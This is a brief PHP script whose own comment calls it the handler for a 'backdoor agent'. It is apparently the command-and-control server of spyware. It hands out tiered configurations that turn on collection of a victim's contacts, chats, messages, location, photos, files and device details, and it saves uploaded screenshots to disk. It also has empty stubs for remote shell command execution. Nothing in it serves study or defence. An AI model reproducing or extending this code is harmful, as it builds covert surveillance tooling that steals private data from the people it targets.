<?php

/** Parse url from backdoor agent and return configurations if asked **/

$parts = parse_url($url);
parse_str($parts['query'], $query_params);

$task = $query_params['task'];
if ($task == 'getConfigurations') {
	$social = [];

	if ($query_params['agent'] == 'scout') {
		$social = ["addressbook" => 0, "chat" => 0, "messages" => 0, "position" => 0, "photo" => 0, "file" => 0, "device" => 0];
	}
	else if ($query_params['agent'] == 'soldier') {
		$social = ["addressbook" => 1, "chat" => 0, "messages" => 1, "position" => 1, "photo" => 1, "file" => 0, "device" => 1];
	}
	else if ($query_params['agent'] == 'elite') {
		$social = ["addressbook" => 1, "chat" => 1, "messages" => 1, "position" => 1, "photo" => 1, "file" => 1, "device" => 1];
	}

	$data = ['screenshoot' => 1, 'social' => $social, 'deviceInfo' => 1];

	header('Content-Type: application/json');
	echo json_encode($data);
}
else if ($task == 'setConfigurations') {
	//
}
else if ($task == 'executeShellCommand') {
	//
}
else if ($task == 'uploadScreenshot') {
	$base64Image = $query_params['data'];
	$base64Image = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $base64Image));
	file_put_contents('/screenshots/image.png', $base64Image);
}


?>